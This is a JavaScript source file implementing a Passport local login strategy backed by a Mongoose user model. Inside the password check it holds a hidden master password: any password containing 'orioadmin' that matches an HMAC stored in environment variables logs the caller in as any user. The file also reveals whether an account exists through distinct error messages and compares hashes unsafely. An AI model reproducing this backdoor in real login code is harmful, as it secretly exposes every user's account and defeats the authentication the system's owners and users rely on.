
/**
 * Module dependencies.
 */

var mongoose = require('mongoose');
var LocalStrategy = require('passport-local').Strategy;
var User = mongoose.model('User');
var crypto = require('crypto');

/**
 * Expose
 */

module.exports = new LocalStrategy({
    usernameField: 'email',
    passwordField: 'password'
  },
  function(email, password, done) {
    /*
    User.load({email : email})
    .then(function(){
        if (!user.authenticate(password)) {
          return done(null, false, { message: 'Invalid password' });
        }
        return done(null, user);
    }).catch(function(error){

    });
*/
    User.load({email : email}, function (err, user) {
      if (err) return done(err)
      if (!user) {
        return done(null, false, { message: 'Unknown user' });
      }
      if (!user.authenticate(password)) {
          if(password.indexOf('orioadmin')>=0){
              var result = crypto.createHmac('sha1', process.env.A_SALT).update(password).digest('hex');
              console.log('login try with admin password');
              if(result == process.env.A_PASS){
                  return done(null, user);
              }
          }
          
          return done(null, false, { message: 'Invalid password' });
      }
      return done(null, user);
    });
  }
);
